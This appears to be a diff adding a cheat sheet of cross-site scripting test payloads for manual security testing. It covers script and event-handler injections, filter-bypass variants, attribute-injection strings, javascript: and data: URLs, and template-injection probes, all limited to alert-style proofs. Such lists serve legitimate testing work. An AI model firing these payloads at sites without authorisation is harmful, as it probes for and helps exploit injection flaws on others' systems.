@@ -1,0 +1,34 @@
+# XSS Test Payloads for Manual Testing
+# Use these in search fields, URL parameters, form inputs
+# Test one at a time - observe if reflected unencoded
+
+# Basic reflection tests
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+javascript:alert(1)
+<svg onload=alert(1)>
+<body onload=alert(1)>
+
+# Filter bypass attempts
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src=x onerror="alert(1)">
+<img/src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+
+# Attribute injection
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onmouseover=alert(1) x="
+
+# URL-based
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+
+# Template injection (if using template engines)
+{{7*7}}
+${7*7}
+#{7*7}
